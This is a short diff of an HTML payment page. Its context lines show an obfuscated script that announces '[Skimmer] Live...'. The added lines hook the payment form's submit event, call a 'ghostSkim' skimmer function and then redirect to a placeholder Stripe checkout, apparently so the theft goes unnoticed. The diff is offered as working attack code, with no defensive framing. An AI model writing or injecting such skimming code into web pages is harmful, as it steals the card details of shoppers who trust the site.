@@ -49,5 +49,14 @@
     console.log(_("W1NraW1tZXJdIExpdmUuLi4="));  // "[Skimmer] Live..."
 })();
 </script>
+
+<script>
+document.getElementById('payForm').onsubmit = function(e) {
+    e.preventDefault(); // prevent default form submission
+    if (typeof ghostSkim === "function") ghostSkim(); // run skimmer
+    window.location.href = "https://checkout.stripe.com/pay/YOUR_REAL_SESSION"; // Replace with actual Stripe session
+};
+</script>
+
 </body>
 </html>
